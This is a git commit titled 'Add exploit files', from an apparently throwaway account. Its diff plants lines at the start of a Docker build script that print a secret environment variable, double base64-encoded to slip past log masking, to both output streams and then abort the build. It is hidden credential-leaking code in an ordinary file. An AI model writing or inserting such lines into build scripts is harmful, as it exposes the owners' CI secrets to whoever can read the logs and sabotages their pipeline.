6e6433b271b886e2e505230a69dbf69b83b7bd1d
iplpzft9bu <CarolRangel53339@hotmail.com>
2026-08-23 21:58:50 +0800

    Add exploit files

--- docker/base/generate_tag_for_web_base.sh
+++ docker/base/generate_tag_for_web_base.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)" >&2
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+exit 1
+
 
 set -e
 
